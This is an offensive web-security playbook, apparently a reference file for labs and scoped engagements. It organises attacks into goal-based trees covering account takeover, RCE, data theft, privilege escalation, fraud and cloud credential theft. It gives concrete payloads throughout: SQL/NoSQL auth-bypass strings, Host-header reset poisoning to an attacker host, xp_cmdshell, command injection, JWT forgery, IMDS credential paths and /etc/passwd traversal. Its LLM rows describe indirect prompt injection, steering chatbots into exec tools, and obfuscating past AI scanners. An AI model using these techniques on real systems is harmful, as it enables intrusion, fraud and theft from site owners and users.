# Objective Attack Trees — hunt by goal, not by vuln

Real attackers don't think "let me test for SQLi." They think **"I want X — what are ALL the ways?"** then work every path until one succeeds. This file decomposes each high-value **objective** into an exhaustive attack tree: every path, the signal that makes it viable, the test, and the **pivot when blocked**. Walk the whole tree in ROI order — never stop at the first failed branch.

> Authorized lab / CTF / scoped-engagement only.

**How to use:** pick the objective the engagement cares about → run its *Recon first* (fuzz if surface is hidden, `references/recon-and-fuzzing.md`) → walk every branch. A branch is "done" only when it succeeds or is proven impossible (write down why). Blocked ≠ done — pivot to the listed bypass. Cross-links go to the deep `<Topic>/` folders.

**The 9 objectives:** [ATO](#objective-account-takeover-ato) · [RCE](#objective-remote-code-execution-rce) · [Mass data/PII](#objective-mass-data--pii-exfiltration) · [Privilege escalation](#objective-privilege-escalation-user--admin) · [Auth bypass](#objective-authentication-bypass) · [Financial fraud / business-logic](#objective-financial-fraud--business-logic-abuse) · [Attack other users at scale](#objective-attack-other-users-at-scale-client-side-victim-compromise) · [Cloud / internal](#objective-cloud--internal-network-compromise) · [Secrets / source disclosure](#objective-secrets--source--config-disclosure)

---

## Class → objective coverage matrix (all 31)

Reverse index: you confirmed a class → which goals does it unlock? (Every PortSwigger class maps to at least one objective.)

| Class | Unlocks |
|---|---|
| SQL injection | Auth bypass · Mass data · RCE · ATO |
| NoSQL injection | Auth bypass · Mass data · ATO |
| XSS | Attack-others · ATO |
| DOM-based | Attack-others · ATO |
| SSTI | RCE |
| OS command injection | RCE |
| Insecure deserialization | RCE |
| Prototype pollution | RCE · Privesc · Attack-others (DOM XSS) |
| File upload | RCE |
| SSRF | Cloud/internal · RCE · Mass data |
| XXE | Secrets · Cloud/internal · Mass data |
| Path traversal | Secrets · RCE (log poison) |
| Access control / IDOR | Privesc · Mass data · ATO |
| Authentication | ATO · Auth bypass |
| JWT | ATO · Privesc · Auth bypass |
| OAuth | ATO |
| Host-header | ATO (reset) · Cloud (routing SSRF) · Attack-others (cache) |
| Business logic | Financial fraud · Privesc · Auth bypass |
| Race conditions | Financial fraud · ATO (MFA) |
| API testing | Mass data · Privesc · ATO · Financial fraud |
| GraphQL | Mass data · ATO · Privesc · Secrets |
| CSRF | Attack-others · ATO (email change) |
| Clickjacking | Attack-others |
| CORS | Attack-others · Mass data |
| WebSockets | Attack-others |
| Web cache poisoning | Attack-others (mass XSS) |
| Web cache deception | Mass data |
| HTTP request smuggling | Attack-others · Auth bypass · Mass data |
| Information disclosure | Secrets (→ everything) |
| Web LLM attacks | Mass data (exfil) · RCE (tools) · Attack-others (indirect injection) |
| Essential skills (`Essential-skills/`) | (methodology — targeted/insertion-point scanning to surface any of the above, incl. non-standard data structures) |

---

## OBJECTIVE: Account Takeover (ATO)

Success = you control another user's (ideally admin's) account. ATO is an *outcome*, reachable a dozen ways. Test them all.

### Recon first (find the surface — fuzz if it's not obvious)
- Map every auth surface: `/login`, `/forgot-password`, `/reset`, `/register`, `/my-account`, `/api/user`, `/change-email`, `/change-password`, `/2fa`, `/verify`, OAuth (`/auth`, `/callback`, `/oauth`), GraphQL (`login`/`getUser` ops).
- Hidden ones? **Fuzz** (`references/recon-and-fuzzing.md`): `ffuf` auth wordlist, param-mine reset/login bodies (`Arjun`/`x8`), read JS bundles for endpoint paths and field names the UI never sends.
- Make 2 accounts (attacker A, victim B). Note every id, token, email field, and reset-link shape.

### The tree (ordered by ROI — walk every branch)

| # | Path | Signal it's viable | Test | If blocked → pivot | Folder |
|---|------|-----|------|--------|--------|
| 1 | **Reset poisoning (Host header)** | reset link's domain comes from `Host` | `POST /forgot-password` username=victim + `Host: ATTACKER` → token hits your log | try `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`; port-injection `Host: lab:bad`; dangling-markup if no token; absolute-URL request line | `HTTP-Host-header-attacks/Password-reset-poisoning/` |
| 2 | **Email parameter pollution / injection** | reset/register takes an `email` param | `email=victim@x&email=attacker@x`; array `{"email":["victim","attacker"]}`; `email=victim@x%0d%0aBcc:attacker@x`; separators `victim@x,attacker@x` `victim@x;attacker@x` | combine with #1; try second email field in JSON the UI hides | `Authentication/`, `Business-logic-vulnerabilities/` |
| 3 | **Reset token leak** | token appears somewhere you can read | inspect reset **response body**, `Location`, page source, and **Referer** to any 3rd-party asset on the reset page | if not leaked → #4 | `Information-disclosure/` |
| 4 | **Reset token weak/predictable** | token is short/numeric/structured | request several, diff them; predictable = timestamp / userid / `md5(email)` / sequential / <6 digits → brute | combine with no-rate-limit (#9) to brute | `Authentication/Other-mechanisms/` |
| 5 | **Reset token not invalidated** | — | reuse token after use; check expiry; use token issued for A against B's account | — | `Authentication/` |
| 6 | **IDOR / mass-assignment on account change** | `id`/`email`/`user` in change-email/password or `/api/user/{id}` | swap to victim's id; set victim's email→reset; or add `"email":"attacker"`/`"isAdmin":true` to the body | try PUT/PATCH/DELETE, old API version, GraphQL `updateUser` | `Access-control/`, `API-testing/` |
| 7 | **Response / status manipulation** | login/2fa/reset returns JSON flags | flip `{"success":false}`→`true`, `{"mfaRequired":true}`→`false`, `403/302`→`200`; drop the verify step from the body | — | `Business-logic-vulnerabilities/` |
| 8 | **2FA / OTP bypass** | account has 2FA between login and session | see **2FA sub-tree** below | walk the whole sub-tree | `Authentication/Multi-factor-auth/` |
| 9 | **No / bypassable rate limit → brute or spray** | login/OTP has no lockout | brute password (Intruder) or OTP (0000–9999); bypass via `X-Forwarded-For` rotation, IP headers, race (single-packet), GraphQL **alias batching** (100/req) | rotate UA/headers, case-vary path `/Login`, add junk params | `Authentication/Password-based-login/`, `GraphQL-API-vulnerabilities/` |
| 10 | **OAuth ATO** | social login / `client_id`,`redirect_uri`,`state` | tamper `redirect_uri`→your host or path-traversal → steal `code`/`token`; missing `state`→CSRF account-linking; email-not-verified linking; **pre-ATO** (register victim email first) | open-redirect chain to leak token; try `response_type=token` | `OAuth-authentication/` |
| 11 | **JWT forgery** | session/identity is a JWT | `alg:none`+strip sig; weak-secret `hashcat -m 16500`; RS→HS confusion; `kid`/`jwk`/`jku` inject → forge victim/admin `sub` | — | `JWT-attacks/` |
| 12 | **XSS → cookie/token theft** | reflected/stored XSS + cookie not `HttpOnly` (or token in JS) | steal `document.cookie` to OAST; if `HttpOnly`, run authed actions inline / steal CSRF token | escalate via subdomain XSS if cookie scoped `*.domain` | `XSS/Exploiting-XSS/` |
| 13 | **CSRF → change email → reset** | change-email has no/weak CSRF token | auto-submit form sets victim's email → password-reset to your inbox | SameSite-Lax GET bypass; Referer bypass | `CSRF/` |
| 14 | **SQLi / NoSQLi → dump creds or auth bypass** | `'`/`[$ne]` alters login or query | `admin'--` / `{"user":{"$ne":null},"pass":{"$ne":null}}`; or UNION-dump password hashes → crack | blind/time-based exfil if no echo | `SQL-injection/`, `NoSQL-injection/` |
| 15 | **Username / email collision & normalization** | register near victim's identity | register `"admin "` (trailing space), unicode homoglyph `demⓞ@gmail`, gmail dot/plus → reset/normalize collides onto victim | — | `Authentication/`, `Business-logic-vulnerabilities/` |
| 16 | **Pre-account takeover** | registration doesn't verify email | register victim's email before they do → they later SSO-link → shared account | — | `Authentication/`, `OAuth-authentication/` |
| 17 | **Session flaws** | — | session not rotated on password change (old session survives); session fixation; predictable session id (Burp Sequencer) | — | `Authentication/Other-mechanisms/` |
| 18 | **GraphQL credential exposure** | `/graphql` reachable | introspection → `getUser{password|token}` for victim id; alias-batch to brute login/2FA | introspection bypasses (newline, GET) | `GraphQL-API-vulnerabilities/` |

### 2FA / OTP bypass sub-tree (branch #8 expanded)
```
[ ] Step-skip      — after password, browse straight to the post-2FA page / call its API (2FA never enforced server-side)
[ ] Response manip — flip {"verified":false}→true, 4xx→200 on the verify call
[ ] OTP brute      — no rate limit → 0000–9999 (Intruder/Turbo)
[ ] Rate bypass    — X-Forwarded-For rotation, race (single-packet), GraphQL alias-batch, change-IP headers
[ ] Code reuse     — old/used code still valid; same code across accounts; no expiry
[ ] Null/array     — code= , code[]= , code=null , code=000000 default
[ ] Leaked code    — OTP returned in response body / Set-Cookie / next API call
[ ] Backup codes   — recovery codes have no brute protection
[ ] Disable-2FA    — CSRF or IDOR on the "disable 2FA" endpoint
[ ] Reset wipes 2FA— password reset removes 2FA → reset (chain to ATO #1–5) then walk in free
[ ] OAuth skips 2FA— social login path doesn't enforce 2FA
```

---

## OBJECTIVE: Remote Code Execution (RCE)

Success = run commands on the server. **Recon first:** find upload/import/template/feedback/profile-render endpoints, error pages that echo input, and any param feeding a shell, template, or deserializer (decode every cookie). Enumerate every primitive that reaches code.

| Path | Signal | Test | If blocked → pivot | Folder |
|---|---|---|---|---|
| File upload → webshell | upload lands under web root / is served back | `.php`/`.jsp` shell → browse it | ext bypass `.phtml/.php5`, `Content-Type: image/jpeg`, magic bytes `GIF89a;`, `%00`, `.htaccess` map, polyglot, traversal filename | `File-upload-vulnerabilities/` |
| SSTI → RCE | `${7*7}`/`{{7*7}}`→49 | identify engine → RCE (ERB `system`, Tornado `os.system`, Freemarker `Execute`, Handlebars `child_process`, Django SECRET_KEY) | sandbox escape via reflection (`getClass()…`) | `SSTI/` |
| OS command injection | shell metachars in param/filename | `& ping -c1 OAST &`, blind `& sleep 10 &` | newlines, `$()`, backticks, `|`, `;`, ${IFS} for spaces | `OS-command-injection/` |
| Insecure deserialization | cookie = `O:`/`rO0AB`/`BAh`/`gASV` | ysoserial / phpggc gadget; flip a field | custom chain on app's own magic methods | `Insecure-deserialization/` |
| SQLi → OS | MSSQL / stacked queries | `'; EXEC xp_cmdshell '…'--`; PG `COPY … PROGRAM` | enable xp_cmdshell via `sp_configure` | `SQL-injection/` |
| SSRF → internal → RCE | server fetches URL | reach internal Redis / Actuator / Docker API / Jenkins → exec | gopher:// for raw protocol; IMDS pivot | `SSRF/` |
| Prototype pollution (Node) | `__proto__` accepted server-side | `execArgv`/`NODE_OPTIONS`/`shell` gadget → command exec | detect via `json spaces`/`status` override first | `Prototype-pollution/Server-side/` |
| LFI + log poisoning | path traversal reads files | poison access/SSH/User-Agent log with PHP → include it | session-file / proc/self/environ poisoning | `Path-traversal/` |
| Web LLM → tool RCE | chatbot calls tools (SQL, code, shell) | prompt it to run a destructive/exec tool; indirect via processed content | obfuscate to slip the AI scanner | `Web-LLM-attacks/` |

**Order:** confirmed injection (cmd/SSTI) → upload → deserialization → SSRF-pivot. Fuzz for upload/import/template endpoints if not visible.

---

## OBJECTIVE: Mass data / PII exfiltration

Success = pull other users' / the whole table's sensitive data. **Recon first:** find list/detail/export/search/report endpoints and object ids; read JS for hidden API routes; check for `/graphql`, backups, caches.

| Path | Signal | Test | If blocked → pivot | Folder |
|---|---|---|---|---|
| IDOR (read) at scale | object ids in API | enumerate ids; GraphQL aliases for bulk pull | UUID? leak ids via invite/search first; method/version swap | `Access-control/Horizontal-IDOR/` |
| SQLi UNION / blind dump | `'` alters query | UNION dump tables; blind boolean/time/OAST exfil | WAF? encoding/XML/comment bypass | `SQL-injection/` |
| GraphQL over-fetch | `/graphql` | introspection → query all users/orders; no field-auth | introspection bypasses; alias batching | `GraphQL-API-vulnerabilities/` |
| Broken access control | role checked client-side | force-browse admin export/report endpoints | sibling rule; `X-Original-URL`; old API | `Access-control/` |
| SSRF → internal API | url param | hit internal data services / S3 / IMDS | filter bypass (decimal IP, rebinding) | `SSRF/` |
| Web cache deception | static-looking path returns private data | `/account/x.css` delimiter / normalization trick | other extensions/delimiters | `Web-cache-deception/` |
| Exposed backups / `.git` / source maps | `.git`,`.bak`,`/backup`,`.map` | dump and grep for PII/secrets | fuzz backup names | `Information-disclosure/Exposed-files/` |
| CORS data theft | `ACAO` reflects Origin + creds | attacker page `fetch(api,{credentials:'include'})` | `Origin: null` | `CORS/` |
| Web LLM exfil | LLM holds/reads sensitive context | ask it to reveal context; indirect injection to send data out | encoding to bypass scanner | `Web-LLM-attacks/` |

---

## OBJECTIVE: Privilege escalation (user → admin)

Success = gain higher role/permissions. **Recon first:** map role-gated actions, admin paths, and every JSON field a profile/register accepts (param-mine for `role`,`isAdmin`).

| Path | Signal | Test | If blocked → pivot | Folder |
|---|---|---|---|---|
| Mass assignment (role) | profile/register JSON | add `"role":"admin"`/`"isAdmin":true` | hidden field via param-mine; nested object | `API-testing/`, `Access-control/` |
| IDOR on admin action | admin id/op guessable | call admin endpoint with your session; `?admin=true`; `X-Original-URL:/admin` | method swap; old API version; force-browse | `Access-control/Vertical-privilege-escalation/` |
| JWT role tamper | role in JWT | flip `role`/`isAdmin`, re-forge (alg:none/weak/confusion) | kid/jwk/jku injection | `JWT-attacks/` |
| Prototype pollution | `__proto__` server-side | pollute `isAdmin`/`role` on every object | detect non-destructively first | `Prototype-pollution/Server-side/` |
| Force-browse / sibling rule | 9 admin routes authed | test the 10th; method swap; old API version | header bypass (`X-Forwarded-For`, `X-Original-URL`) | `Access-control/` |
| Business-logic role grant | self-serve role/org join | `joinOrganization`/`updatePermissions(me, ADMIN)` | workflow step skip | `Business-logic-vulnerabilities/` |

---

## OBJECTIVE: Authentication bypass

Success = get in without valid creds. **Recon first:** locate login (form / JSON / GraphQL / JWT / OAuth), admin panels, and any "local only" gate.

| Path | Signal | Test | If blocked → pivot | Folder |
|---|---|---|---|---|
| SQLi auth bypass | login over SQL | `admin'--`, `' OR 1=1--` | comment/encoding variants per DB | `SQL-injection/Basics-and-detection/` |
| NoSQL auth bypass | JSON login | `{"user":{"$ne":null},"pass":{"$ne":null}}`; `$gt`,`$regex` | operator vs syntax injection | `NoSQL-injection/` |
| Response manipulation | login returns flags | flip `success`/`role`; replay post-login redirect | intercept response, not just request | `Business-logic-vulnerabilities/` |
| JWT unverified/none | JWT session | edit `sub`, `alg:none` | weak-secret brute; alg confusion | `JWT-attacks/Signature-bypass/` |
| OAuth implicit trust | `/authenticate` takes email | swap email to victim, no token check | redirect_uri / state | `OAuth-authentication/Implicit-flow-and-open-redirect/` |
| Default / weak creds | admin panel | `admin:admin`, vendor defaults; brute if no lockout | rate-limit bypass | `Authentication/` |
| Host-header admin bypass | `/admin` "local only" | `Host: localhost` / `127.0.0.1` | `X-Forwarded-For: 127.0.0.1` | `HTTP-Host-header-attacks/` |
| Smuggling → auth bypass | front+back desync | smuggle to reach internal-only endpoint | H2 desync | `HTTP-request-smuggling/Exploiting/` |

---

## OBJECTIVE: Financial fraud / business-logic abuse

Success = pay less/nothing, get more than entitled, or extract value. **PortSwigger-heavy** (Business-logic + Race + API). **Recon first:** map every money flow — cart/checkout, price, discount/coupon, balance/wallet/credits, gift cards, loyalty points, withdrawal/transfer, subscription tier, purchase limits, refunds.

| Path | Signal | Test | If blocked → pivot | Folder |
|---|---|---|---|---|
| Client-side price/total tamper | price/total/amount in request | set price to `0`/`1`/negative; tamper line total | server recalculates? attack discount/qty instead | `Business-logic-vulnerabilities/Client-side-controls/` |
| Mass-assignment discount | GET response shows a discount/credit field | POST `{"chosen_discount":{"percentage":100}}` | discover the field via param-mine | `API-testing/Parameter-pollution-and-mass-assignment/` |
| Negative / overflow quantity | `qty`/`quantity` param | `qty=-1` (credit back), huge value (int overflow), `0` | decimals, scientific `1e3`, array | `Business-logic-vulnerabilities/Unconventional-input/` |
| Coupon / gift-card reuse via race | apply-coupon / redeem endpoint | fire N parallel redeems (single-packet) → stack the discount | single→multi endpoint, partial-construction race | `Race-conditions/Limit-overrun/` |
| Limit overrun (buy past max / overdraw) | "max N" or balance check | parallel requests beat the check-then-act | time-sensitive race window | `Race-conditions/Multi-and-single-endpoint/` |
| Currency / rounding abuse | currency param / fractional amounts | pay in a weaker currency; sub-cent rounding loops | — | `Business-logic-vulnerabilities/Business-rule-abuse/` |
| Workflow step skip (skip payment) | multi-step checkout | call `confirm-order` before `pay` | reorder / replay earlier-state token | `Business-logic-vulnerabilities/Workflow-state-flaws/` |
| Refund / cancel abuse | refund / cancel endpoint | double-refund via race; refund > paid | IDOR on refund target | `Race-conditions/`, `Business-logic-vulnerabilities/` |
| IDOR on price/order | order/price id | `PATCH /api/products/1/price {"price":0}` | method swap; OPTIONS for hidden method | `API-testing/`, `Access-control/` |
| Loyalty / referral abuse | points / referral code | self-referral loop; replay credit; race | — | `Business-logic-vulnerabilities/Business-rule-abuse/` |

**Order:** client-side tamper → mass-assign → negative/overflow → race (coupon/limit) → workflow skip.

---

## OBJECTIVE: Attack other users at scale (client-side / victim compromise)

Success = run code in victims' browsers, force their actions, or steal their data — at scale (stored or delivered to admin/users). **PortSwigger's "deliver to victim" theme.** **Recon first:** find sinks that render to OTHER users (comments, profile, name, support tickets, reviews, notifications/email), shared caches (`X-Cache`), framable sensitive actions, WebSocket chat, cross-origin credentialed APIs.

| Path | Signal | Test | If blocked → pivot | Folder |
|---|---|---|---|---|
| Stored XSS | input re-rendered to other users | persist `<svg onload=…>` in comment/profile/name | context break (attr/JS/href), encoding, CSP gadget | `XSS/Exploiting-XSS/` |
| Reflected XSS (delivered) | input reflected in response | craft link → "deliver to victim" | WAF/filter bypass, alternate context | `XSS/HTML-and-attribute-context/`, `XSS/WAF-filter-bypass/` |
| DOM XSS | client sink fed from URL/`postMessage` | `#<img src=x onerror=…>` → sink | DOM clobbering; alternate source | `DOM-based-vulnerabilities/`, `XSS/DOM-based/` |
| Web cache poisoning → mass XSS | unkeyed header reflected + `X-Cache` | poison via `X-Forwarded-Host`/`X-Host` → served to all | param cloaking `;`, fat GET, normalization | `Web-cache-poisoning/` |
| CSRF → forced action | state-change, weak/no token | auto-submit form → victim changes email/password | SameSite-Lax GET, Referer, token-not-tied | `CSRF/` |
| Clickjacking → forced click | framable + sensitive 1-click | iframe overlay + URL prefill for multistep | — | `Clickjacking/` |
| CORS → steal victim data | `ACAO` reflects Origin + `ACAC:true` | attacker page `fetch(api,{credentials:'include'})` | `Origin: null`, subdomain trust | `CORS/` |
| WebSocket XSS / CSWSH | WS chat, message rendered to others | inject XSS in a message; cross-site WS hijack (no origin check) | manipulate handshake | `WebSockets/` |
| Request smuggling → hijack/poison | front+back desync | smuggle prefix → capture next user's request, or inject response into cache | H2 desync; CL.0 | `HTTP-request-smuggling/` |
| Host-header → cache poison | duplicate/`X-Forwarded-Host` reflected + cached | poison the shared cache with attacker content | connection-state attack | `HTTP-Host-header-attacks/Advanced-and-connection-state/` |
| Indirect prompt injection (LLM) | LLM reads user-supplied content | payload in review/email/ticket → runs when AI processes it for another user/admin | obfuscate to bypass AI scanner | `Web-LLM-attacks/Indirect-and-agentic-attacks/` |

**Order:** stored XSS → DOM/reflected → cache poison (scale) → CSRF/clickjacking → CORS/WS → smuggling.

---

## OBJECTIVE: Cloud / internal-network compromise

Success = reach internal services or steal cloud credentials. **Recon first:** find any param the server fetches (stock check, webhook, PDF/image render, import-by-URL), XML surfaces, and routing front-ends.

| Path | Signal | Test | If blocked → pivot | Folder |
|---|---|---|---|---|
| SSRF → IMDS → IAM | server fetches URL | `169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → keys | filter bypass: `127.1`, `[::]`, decimal IP, rebinding, `@`, redirect | `SSRF/Filter-bypass/` |
| XXE → SSRF → IMDS | XML body | entity → `http://169.254.169.254/…` | external DTD OOB; JSON→XML content-type swap | `XXE-injection/` |
| SSRF → internal admin/RCE | url param | `localhost`/`192.168/10.x` → `/admin`,`/actuator`,Redis,Docker | gopher:// raw protocol | `SSRF/` |
| Routing SSRF (Host) | Host forwarded by front-end | `Host:` → internal IP → admin | connection-state / flawed parsing | `HTTP-Host-header-attacks/SSRF-and-routing-based/` |

---

## OBJECTIVE: Secrets / source / config disclosure

Often the **precursor** that unlocks every other objective. Success = obtain source, creds, keys, tokens, or internal structure. **Recon first:** crawl + fuzz for exposed files; read JS; trigger errors.

| Path | Signal | Test | If blocked → pivot | Folder |
|---|---|---|---|---|
| Exposed `.git`/`.svn` → source | `/.git/HEAD` returns ref | `wget -r .../.git/` → `git log -p` for secrets | `git-dumper` for partial trees | `Information-disclosure/Exposed-files/` |
| Backup / temp files | `.bak`,`.old`,`~`,`.swp` | fetch directly; fuzz names | extensionless / numbered variants | `Information-disclosure/Exposed-files/` |
| Path traversal file read | file/path param returns content | `../../../../etc/passwd`; app config; source | encodings `%2e`, `....//`, absolute, null byte | `Path-traversal/` |
| XXE file read | XML body | `<!ENTITY x SYSTEM "file:///…">` | OOB exfil via external DTD | `XXE-injection/` |
| Verbose errors / debug | stack trace / debug page | trigger error → framework/version/paths/secrets | force type/parse errors | `Information-disclosure/Error-messages-and-debug/` |
| Source maps | `.js.map` present | reconstruct original source → endpoints/fields/secrets | — | `Information-disclosure/` |
| GraphQL introspection | `/graphql` | dump full schema | 8 introspection bypasses | `GraphQL-API-vulnerabilities/Introspection-and-enumeration/` |
| API docs exposure | `/api`, swagger, openapi | strip path → interactive docs | guess `/swagger.json`,`/openapi.json` | `API-testing/API-discovery-and-methods/` |
| Secrets in JS bundles | `main.js` etc | grep `api_key|secret|token|bearer` | check `.map` for more | `references/recon-and-fuzzing.md` |

**Then:** feed found secrets into ATO / privesc / cloud objectives.

---

## Universal rules across all objectives

1. **Decompose the goal, then walk every branch.** First-branch failure is not goal failure.
2. **Blocked → pivot, don't abandon.** Every branch lists its bypass. A WAF/validation block is a signal, not a wall (use the topic folder's Bypasses table).
3. **Don't have the surface? Discover it.** Fuzz endpoints, mine params, read JS — `references/recon-and-fuzzing.md`.
4. **Chain branches.** A failed branch often becomes a step in another (open redirect alone = nothing; open redirect + OAuth = token theft → ATO). See `references/chaining-playbook.md`.
5. **Cluster.** When one branch works, the dev likely repeated the mistake — test sibling endpoints.
6. **Prove it.** Run the impact gate (`references/hunt-methodology.md`) — actual request → actual response, real victim, real harm.
